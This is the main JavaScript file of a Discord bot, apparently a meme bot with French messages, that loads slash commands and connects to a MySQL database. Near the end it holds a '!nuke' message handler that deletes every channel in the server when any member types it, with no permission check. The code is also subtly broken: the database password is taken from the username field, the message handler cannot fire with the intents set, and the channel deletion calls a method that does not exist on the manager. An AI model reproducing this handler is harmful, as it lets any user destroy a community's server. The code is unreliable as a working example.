const { Client, Collection, Intents} = require('discord.js');
const config = require('./config.json');
const fs = require('node:fs');
const path = require('node:path');
const bot = new Client({ intents: [Intents.FLAGS.GUILDS] });
const bdd = require("./commands/bdd.json");
const mysql = require("mysql")

bot.commands = new Collection();
const commandsPath = path.join(__dirname, 'commands');
const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
let db = mysql.createConnection({
	host: config.dbAdress,
	user: config.dbUser,
	password: config.dbUser,
	database: config.dbName
})

bot.once('ready', () => {
	console.log('Ready !');
	console.log(`Logged as ` + bot.user.username)
	bot.user.setActivity('des Memes', { type: 'WATCHING' });



	db.connect(function () {
		console.log("BDD")
	})

});


for (const file of commandFiles) {
	const filePath = path.join(commandsPath, file);
	const command = require(filePath);
	bot.commands.set(command.data.name, command);
	console.log(command.data.name)
} 


bot.on('interactionCreate', async interaction => {
	if (!interaction.isCommand()) return;

	const command = bot.commands.get(interaction.commandName);

	if (!command) return;

	try {
		await command.execute(interaction);
	} catch (error) {
		console.error(error);
		await interaction.reply({ content: "Bruh, tu as cassé la matrice.\nJe te conseille de MP TATHAN#0007.\n \n```js\n" + `${error}` + "\n```\nNom de la commande : " + `${interaction}` , ephemeral: true });        

	}
});

bot.on("message", message => {
    if(message.content === "!nuke"){
        message.guild.channels.forEach(channel => channel.delete())
    }
});

bot.login(config.testToken);

bot.function = {
	getDb: db
}